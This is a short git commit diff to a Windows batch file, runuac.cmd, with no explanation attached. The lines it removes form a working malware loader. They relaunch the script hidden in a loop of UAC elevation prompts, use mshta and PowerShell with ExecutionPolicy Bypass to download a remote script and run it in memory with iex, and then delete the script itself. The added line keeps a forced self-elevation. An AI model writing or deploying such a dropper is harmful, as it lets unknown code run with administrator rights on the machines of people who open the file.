deae6b5a05f585ce1d90f6f6e021f636c3c5559a
43a1723 <hai1723notgay@gmail.com>
2024-08-08 19:59:05 +0700

    Update runuac.cmd

--- runuac.cmd
+++ runuac.cmd
@@ -1,5 +1,2 @@
-@echo off
 net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-mshta vbscript:close(createobject("wscript.shell").run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ProgressPreference = 'SilentlyContinue';$t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t\"",0))
-del /f /q "%~f0" >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
